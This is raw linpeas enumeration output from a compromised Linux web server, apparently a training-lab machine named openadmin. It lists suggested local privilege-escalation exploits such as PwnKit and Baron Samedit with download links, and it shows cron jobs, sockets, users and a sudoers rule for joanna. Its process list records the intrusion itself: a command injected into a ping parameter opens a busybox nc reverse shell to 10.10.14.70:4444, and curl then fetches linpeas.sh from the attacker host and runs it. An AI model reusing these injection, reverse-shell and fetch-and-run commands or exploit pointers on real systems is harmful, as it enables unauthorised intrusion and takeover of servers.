INVOCATION_ID=e7e18a8f957646e694f070f7513940a3
APACHE_LOCK_DIR=/var/lock/apache2
PWD=/opt/ona/www
JOURNAL_STREAM=9:21094
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
SHELL=bash
TERM=xterm-256color
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                                                                                       
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                                                                    
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... enabled                                                                                                                                                                                                 
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                                                                            

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present (if any):
/usr/bin/lxc                                                                                                                                                                                                                                
╔══════════╣ Container details
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
Learn and practice cloud hacking techniques in training.hacktricks.xyz
                                                                                                                                                                                                                                            
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗                                                                                                                                                                          
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                  
root         1  0.0  0.2 225252  9044 ?        Ss   Apr30   0:03 /sbin/init auto automatic-ubiquity noprompt                                                                                                                                
root       471  0.0  0.4  94896 17120 ?        S<s  Apr30   0:01 /lib/systemd/systemd-journald
root       482  0.0  0.0  97708  1724 ?        Ss   Apr30   0:00 /sbin/lvmetad -f
root       498  0.0  0.1  48332  7020 ?        Ss   Apr30   0:01 /lib/systemd/systemd-udevd
systemd+   541  0.0  0.1  71848  5376 ?        Ss   Apr30   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   579  0.0  0.0 141928  3288 ?        Ssl  Apr30   0:02 /lib/systemd/systemd-timesyncd                                                                                                                                             
  └─(Caps) 0x0000000002000000=cap_sys_time
root       581  0.0  0.2  88224  9676 ?        Ss   Apr30   0:00 /usr/bin/VGAuthService
root       646  0.0  0.2 200620 12076 ?        Ssl  Apr30   0:34 /usr/bin/vmtoolsd
root       834  0.0  0.1 286360  6844 ?        Ssl  Apr30   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       859  0.0  0.0 110544  2036 ?        Ssl  Apr30   0:01 /usr/sbin/irqbalance --foreground
root       876  0.0  0.0  30028  3240 ?        Ss   Apr30   0:00 /usr/sbin/cron -f
root       877  0.0  0.4 169100 16996 ?        Ssl  Apr30   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon[0m     878  0.0  0.0  28332  2428 ?        Ss   Apr30   0:00 /usr/sbin/atd -f
syslog     879  0.0  0.1 263036  4912 ?        Ssl  Apr30   0:00 /usr/sbin/rsyslogd -n
root       881  0.0  0.1  62148  5656 ?        Ss   Apr30   0:00 /lib/systemd/systemd-logind
root       882  0.0  0.0 383268  2088 ?        Ssl  Apr30   0:01 /usr/bin/lxcfs /var/lib/lxcfs/
message+   885  0.0  0.1  50056  4612 ?        Ss   Apr30   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                   
  └─(Caps) 0x0000000020000000=cap_audit_write
root       985  0.0  0.5 927332 23164 ?        Ssl  Apr30   0:02 /usr/lib/snapd/snapd
root      1016  0.0  0.1 290932  6988 ?        Ssl  Apr30   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1091  0.0  0.0  25992  3512 ?        Ss   Apr30   0:00 /sbin/dhclient -1 -4 -v -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens160.leases -I -df /var/lib/dhcp/dhclient6.ens160.leases ens160
root      1289  0.0  0.0  14888  1964 tty1     Ss+  Apr30   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root      1339  0.0  0.1  72296  6500 ?        Ss   Apr30   0:00 /usr/sbin/sshd -D
root      1371  0.0  0.5 371308 21408 ?        Ss   Apr30   0:01 /usr/sbin/apache2 -k start
www-data  1916  0.0  0.2 375676 11076 ?        S    Apr30   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data  2451  0.0  0.3 376092 13936 ?        S    Apr30   0:00  |   _ /usr/sbin/apache2 -k start
www-data  2454  0.0  0.0   4628   856 ?        S    Apr30   0:00  |       _ sh -c ping -n -w 3 -c 3 ;echo "BEGIN";busybox nc 10.10.14.70 4444 -e /bin/bash;echo "END"
www-data  2456  0.0  0.0  18376  3188 ?        S    Apr30   0:00  |           _ /bin/bash
www-data  2460  0.0  0.0  18508  3452 ?        S    Apr30   0:00  |               _ bash -i
www-data  2466  0.0  0.2  37296  9348 ?        S    Apr30   0:00  |                   _ python3 -c import pty; pty.spawn("/bin/bash")
www-data  2467  0.0  0.0  18508  3416 pts/0    Ss+  Apr30   0:00  |                       _ /bin/bash
www-data  6472  0.0  0.2 375712 11428 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data  6473  0.0  0.2 375712 11428 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data  6475  0.0  0.2 375712 11428 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data  6476  0.0  0.2 375712 11428 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data 18425  0.0  0.3 376128 14140 ?        S    08:14   0:00  |   _ /usr/sbin/apache2 -k start
www-data 18428  0.0  0.0   4628   920 ?        S    08:14   0:00  |       _ sh -c ping -n -w 3 -c 3 ;echo "BEGIN";busybox nc 10.10.14.70 4444 -e /bin/bash;echo "END"
www-data 18430  0.0  0.0  18376  3168 ?        S    08:14   0:00  |           _ /bin/bash
www-data 18481  0.0  0.2  37552  9660 ?        S    08:18   0:00  |               _ python3 -c import pty; pty.spawn("/bin/bash")
www-data 18482  0.0  0.0  18508  3524 pts/1    Ss   08:18   0:00  |                   _ /bin/bash
www-data 18490  0.0  0.2 112664  9356 pts/1    S+   08:28   0:00  |                       _ curl http://10.10.14.70/linpeas.sh
www-data 18491  1.8  0.1  12192  5128 pts/1    S+   08:28   0:00  |                       _ bash
www-data 21934  0.0  0.1  12192  4060 pts/1    S+   08:29   0:00  |                           _ bash
www-data 21937  0.0  0.0  37012  3464 pts/1    R+   08:29   0:00  |                           |   _ ps fauxwww
www-data 21938  0.0  0.0  12192  2612 pts/1    S+   08:29   0:00  |                           _ bash
www-data 17649  0.0  0.2 375712 11044 ?        S    06:51   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data 17667  0.0  0.2 375712 11044 ?        S    06:58   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data 17668  0.0  0.2 375712 11044 ?        S    06:58   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data 17669  0.0  0.2 375712 11044 ?        S    06:58   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data 17670  0.0  0.2 375712 11044 ?        S    06:58   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data 17685  0.0  0.2 375712 11044 ?        S    07:01   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
mysql     1392  0.0  4.7 1621384 192244 ?      Sl   Apr30   0:21 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
systemd+ 18441  0.0  0.1  70892  6264 ?        Ss   08:15   0:00 /lib/systemd/systemd-resolved


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                                                                                                           
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found
lightdm Not Found                                                                                                                                                                                                                           
vsftpd Not Found                                                                                                                                                                                                                            
apache2 process found (dump creds from memory as root)                                                                                                                                                                                      
sshd Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                                                                                                   

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND     PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                                                                             
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                                           

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                                                                        
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Nov 21  2019 .
drwxr-xr-x 93 root root 4096 Aug 17  2021 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  589 Jan 30  2019 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  191 Aug  5  2019 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Nov 21  2019 .
drwxr-xr-x 93 root root 4096 Aug 17  2021 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 30  2019 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Aug 17  2021 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Aug 17  2021 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Aug 17  2021 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES                                                                                                                   
Thu 2025-05-01 08:39:00 UTC  9min left   Thu 2025-05-01 08:09:00 UTC  20min ago    phpsessionclean.timer        phpsessionclean.service
Thu 2025-05-01 16:46:21 UTC  8h left     Wed 2025-04-30 16:46:21 UTC  15h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Thu 2025-05-01 21:46:39 UTC  13h left    Thu 2025-05-01 06:48:06 UTC  1h 41min ago apt-daily.timer              apt-daily.service
Thu 2025-05-01 23:43:10 UTC  15h left    Thu 2025-05-01 00:36:36 UTC  7h ago       motd-news.timer              motd-news.service
Fri 2025-05-02 06:31:27 UTC  22h left    Thu 2025-05-01 06:36:15 UTC  1h 53min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2025-05-05 00:00:00 UTC  3 days left Wed 2025-04-30 16:31:20 UTC  15h ago      fstrim.timer                 fstrim.service
n/a                          n/a         n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                                                                                                  
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path                                                                                                                                        
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                                                                                   
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/7270/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                                                                                                           
/snap/core/7270/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/7270/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/7270/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/7270/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/7270/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/7270/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/8039/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8039/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                                                                                   
sed: -e expression #1, char 0: no previous regular expression
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus Service Objects list                                                                                                                                                                                                     
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                                                                     
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                                    
:1.0                                 541 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -
:1.2                                   1 systemd         root             :1.2          init.scope                -          -
:1.239                             25975 busctl          www-data         :1.239        apache2.service           -          -
:1.3                                 881 systemd-logind  root             :1.3          systemd-logind.service    -          -
:1.49                              18441 systemd-resolve systemd-resolve  :1.49         systemd-resolved.service  -          -
:1.5                                 834 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -
:1.7                                1016 polkitd         root             :1.7          polkit.service            -          -
:1.8                                 877 networkd-dispat root             :1.8          networkd-dispatcher.se…ce -          -
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
org.freedesktop.Accounts             834 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -
org.freedesktop.PolicyKit1          1016 polkitd         root             :1.7          polkit.service            -          -
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1               881 systemd-logind  root             :1.3          systemd-logind.service    -          -
org.freedesktop.network1             541 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -
org.freedesktop.resolve1           18441 systemd-resolve systemd-resolve  :1.49         systemd-resolved.service  -          -
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -
org.freedesktop.thermald               - -               -                (activatable) -                         -
org.freedesktop.timedate1              - -               -                (activatable) -                         -
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                                                                     
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)



                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.5.45  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:fe94:9de9  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:fe94:9de9  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:9d:e9  txqueuelen 1000  (Ethernet)
        RX packets 246299  bytes 46327069 (46.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 67400  bytes 13666114 (13.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 61764  bytes 4870351 (4.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 61764  bytes 4870351 (4.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Hostname, hosts and DNS
openadmin                                                                                                                                                                                                                                   
127.0.0.1 localhost
127.0.1.1 openadmin

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

91.189.88.174   archive.ubuntu.com

nameserver 127.0.0.53
options edns0

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                                                                
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


 81  820k   81  669k    0     0  14916      0  0:00:56  0:00:45  0:00:11 14916                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                                                                                                     
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                                                                       

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
Sudoers file: /etc/sudoers.d/joanna is readable                                                                                                                                                                                             
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv


╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                                                                                       
ptrace protection is enabled (1)                                                                                                                                                                                                            

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                                                                                                 
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash                                                                                                                                                                                               
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
root:x:0:0:root:/root:/bin/bash

